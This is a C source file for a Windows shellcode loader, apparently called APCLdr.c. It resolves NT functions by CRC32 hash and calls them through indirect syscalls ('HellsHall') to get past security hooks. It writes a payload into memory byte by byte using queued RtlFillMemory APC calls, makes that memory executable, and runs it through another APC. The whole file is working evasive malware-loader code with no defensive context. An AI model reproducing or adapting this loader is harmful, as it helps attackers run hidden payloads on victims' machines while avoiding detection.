#include <Windows.h>
#include "Structs.h"
#include "Common.h"
#include "HellsHall.h"
#include "Debug.h"
#include "Resource.h"




typedef struct _MyStruct
{
	SysFunc NtAllocateVirtualMemory;
	SysFunc NtProtectVirtualMemory;
	SysFunc NtCreateThreadEx;
	SysFunc NtQueueApcThread;
	SysFunc NtWaitForSingleObject;

}MyStruct, * PMyStruct;


MyStruct S = { 0 };




BOOL Initialize() {

	RtlSecureZeroMemory(&S, sizeof(MyStruct));

	if (!InitilizeSysFunc(NtAllocateVirtualMemory_CRC32b))
		return FALSE;
	getSysFuncStruct(&S.NtAllocateVirtualMemory);

	if (!InitilizeSysFunc(NtProtectVirtualMemory_CRC32b))
		return FALSE;
	getSysFuncStruct(&S.NtProtectVirtualMemory);

	if (!InitilizeSysFunc(NtCreateThreadEx_CRC32b))
		return FALSE;
	getSysFuncStruct(&S.NtCreateThreadEx);

	if (!InitilizeSysFunc(NtQueueApcThread_CRC32b))
		return FALSE;
	getSysFuncStruct(&S.NtQueueApcThread);

	if (!InitilizeSysFunc(NtWaitForSingleObject_CRC32b))
		return FALSE;
	getSysFuncStruct(&S.NtWaitForSingleObject);


	return TRUE;
}




VOID AlertableFunc() {

	HANDLE hEvent = CreateEvent(NULL, 0, 0, NULL);
	if (hEvent) {
#ifdef DEBUG
		PRINTA("[i] Sleeping For %0.3d Sec ... ", (SLEEP / 1000));
#endif // DEBUG

		MsgWaitForMultipleObjects(1, &hEvent, TRUE, (DWORD)(SLEEP + 1000), QS_KEY);
		CloseHandle(hEvent);
#ifdef DEBUG
		PRINTA("[+] DONE \n");
#endif // DEBUG
	}

	ExitThread(0);
}



BOOL NtApcWrite(IN PBYTE pBuff, IN SIZE_T sLen, OUT LPVOID* ppAddress) {


	PVOID		pRtlFillMemory = NULL,
				pAddress = NULL;

	SIZE_T		sSize = sLen;

	DWORD		dwOldProtection = 0x00;

	HANDLE		hThread = NULL;

	NTSTATUS	STATUS = 0x00;


	pRtlFillMemory = GetProcAddressH(GetModuleHandleH(KERNEL32A_CRC32b), RtlFillMemoryA_CRC32b);
	if (!pRtlFillMemory)
		return FALSE;



	SYSCALL(S.NtAllocateVirtualMemory);
	if (!NT_SUCCESS(STATUS = HellHall((HANDLE)-1, &pAddress, 0, &sSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE))) {
#ifdef DEBUG
		PRINTA("[!] NtAllocateVirtualMemory Failed With Status : 0x%0.8X (APCLdr.c:100)\n", STATUS);
#endif // DEBUG

		return FALSE;
	}

#ifdef DEBUG
	PRINTA("[+] Allocated Address : 0x%p \n", pAddress);
#endif // DEBUG

	SYSCALL(S.NtCreateThreadEx);
	if (!NT_SUCCESS(STATUS = HellHall(&hThread, 0x1FFFFF, NULL, (HANDLE)-1, (LPVOID)AlertableFunc, NULL, FALSE, NULL, NULL, NULL, NULL))) {
#ifdef DEBUG
		PRINTA("[!] NtCreateThreadEx Failed With Status : 0x%0.8X (APCLdr.c:113)\n", STATUS);
#endif // DEBUG
		return FALSE;
	}


	SYSCALL(S.NtQueueApcThread);
	for (size_t i = 0; i < sLen; i++) {

		/*
			- RCX: (PVOID)((PBYTE)pAddress + i)
			- RDX: 1
			- R8D: (PVOID)pBuff[i]
		*/

		if (!NT_SUCCESS(STATUS = HellHall(hThread, pRtlFillMemory, (PVOID)((PBYTE)pAddress + i), (PVOID)1, (PVOID)pBuff[i]))) {
#ifdef DEBUG
			PRINTA("[!] NtQueueApcThread [ %0.3d - 0x%p ] Failed With Status : 0x%0.8X (APCLdr.c:130)\n", i, (PVOID)((PBYTE)pAddress + i), STATUS);
#endif // DEBUG

			return FALSE;
		}
	}

	SYSCALL(S.NtWaitForSingleObject);
	if (!NT_SUCCESS(STATUS = HellHall(hThread, TRUE, NULL))) {
#ifdef DEBUG
		PRINTA("[!] NtWaitForSingleObject Failed With Status : 0x%0.8X (APCLdr.c:140)\n", STATUS);
#endif // DEBUG

		return FALSE;
	}

	SYSCALL(S.NtProtectVirtualMemory);
	if (!NT_SUCCESS(STATUS = HellHall((HANDLE)-1, &pAddress, &sLen, PAGE_EXECUTE_READWRITE, &dwOldProtection))) {
#ifdef DEBUG
		PRINTA("[!] NtProtectVirtualMemory Failed With Status : 0x%0.8X (APCLdr.c:149)\n", STATUS);
#endif // DEBUG

		return FALSE;
	}

	*ppAddress = pAddress;

	return TRUE;
}





BOOL RunViaNtApc(IN LPVOID pAddress) {

	HANDLE		hThread = NULL;
	NTSTATUS	STATUS	= 0x00;

	SYSCALL(S.NtCreateThreadEx);
	if (!NT_SUCCESS(STATUS = HellHall(&hThread, 0x1FFFFF, NULL, (HANDLE)-1, (LPVOID)AlertableFunc, NULL, FALSE, NULL, NULL, NULL, NULL))) {
#ifdef DEBUG
		PRINTA("[!] NtCreateThreadEx Failed With Status : 0x%0.8X (APCLdr.c:172)\n", STATUS);
#endif // DEBUG
		return FALSE;
	}

	SYSCALL(S.NtQueueApcThread);
	if (!NT_SUCCESS(STATUS = HellHall(hThread, pAddress, NULL, NULL, NULL))) {
#ifdef DEBUG
		PRINTA("[!] NtQueueApcThread Failed With Status : 0x%0.8X (APCLdr.c:180)\n", STATUS);
#endif // DEBUG
		return FALSE;
	}

	SYSCALL(S.NtWaitForSingleObject);
	if (!NT_SUCCESS(STATUS = HellHall(hThread, TRUE, NULL))) {
#ifdef DEBUG
		PRINTA("[!] NtWaitForSingleObject Failed With Status : 0x%0.8X (APCLdr.c:188)\n", STATUS);
#endif // DEBUG
		return FALSE;
	}

	return TRUE;
}






